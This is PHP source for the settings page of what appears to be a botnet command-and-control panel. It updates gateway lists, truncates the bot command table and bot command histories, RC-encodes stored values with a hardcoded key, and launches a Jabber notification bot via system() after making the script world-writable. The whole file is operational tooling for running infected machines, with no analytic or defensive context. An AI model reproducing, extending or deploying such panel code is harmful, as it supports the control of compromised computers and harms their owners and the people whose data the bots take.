<?php

get_function('rc');

$smarty->assign('autorizekey', $autorizekey);

if(isset($_POST['save'])){
    unset($_POST['save']);

    if(!empty($_POST['gws'])){    	file_put_contents('cache/gateways.json', json_encode(explode(',', $_POST['gws'])));
    	unset($_POST['gws']);
    }

    $conf = json_decode(file_get_contents('cache/config.json'), 1);

    if($conf['scramb'] != $_POST['scramb']){    	$mysqli->query('TRUNCATE TABLE bf_cmds');
    	$mysqli->query('UPDATE bf_bots SET cmd_history = \'\'');
	}
	if($_POST['scramb'] == 1){		if(!empty($_POST['hunter'])){
			$_POST['hunter'] = rc_encode($_POST['hunter'], $rc['key']);
		}else{			$_POST['hunter'] = '';
		}
	}

	$_POST['hist'] = $conf['hist'];

    file_put_contents('cache/config.json', json_encode($_POST));

    if($conf['lang'] != $_POST['lang']){
    	header('Location: /settings/');
	}
}

if(isset($_POST['jabber_stop'])){
   file_put_contents('cache/jabber_off', true);
   $i = 0;
   do{   	 sleep(1);
   	 if(!file_exists('cache/jabber_off')){   	 	$i = 21;   	 }else{   	 	$i++;
   	 }
   }while($i <= 20);

   header('Location: /settings/');
   exit;
}elseif(isset($_POST['jabber_start'])){
   if(file_exists('cache/jabber_off')) unlink('cache/jabber_off');
   $smarty->assign('jabber_start', 1);
   $dir = pathinfo(__FILE__, PATHINFO_DIRNAME);
   $dir_site = realpath($dir . '/../../');
   chmod($dir_site . '/crons/scripts/jabber_bot_start.php', 0777);
   @system($dir_site . '/crons/scripts/jabber_bot_start.php > /dev/null &');
}

/*
if(isset($_POST['genkey_start'])){
   require_once('classes/rsa.class.php');
   $RSA = new RSA();

   $keys = $RSA->auto_generate_keys();

   $conf = json_decode(file_get_contents('cache/config.json'), true);

   $conf['hash_key'] = $keys[0] . ',' . $keys[1] . ',' . $keys[2];
   $conf['hash_key'] = str_split($conf['hash_key'], 3);
   $hk = '';
   for($i = 0; $i < count($conf['hash_key']); $i++){
   		$hk .= base64_encode($conf['hash_key'][$i]);
   }
   $conf['hash_key'] = base64_encode($hk);

   file_put_contents('cache/config.json', json_encode($conf));

   header('Location: /settings/');
   exit;
}
*/

if(file_exists($cfg['dir'] . 'cache/gateways.json')){	$gws = implode(',', json_decode(file_get_contents('cache/gateways.json'), 1));
}

if(file_exists($cfg['dir'] . 'cache/config.json')){
	$conf = json_decode(file_get_contents('cache/config.json'), 1);
	$_POST = $conf;
	$_POST['gws'] = $gws;

	if($_POST['scramb'] == 1 && !empty($_POST['hunter'])) $_POST['hunter'] = rc_decode($_POST['hunter'], $rc['key']);
	if(empty($_POST['rc']))	$_POST['rc'] = rc_encode($rc['key'], 'AUvS8jou0Z9K7Bf9');
}

$socket = @stream_socket_server("tcp://0.0.0.0:16817", $errno, $errstr);
if (!$socket){
	$smarty->assign("jabber_start", 1);
}else{	fclose($socket);
}

?>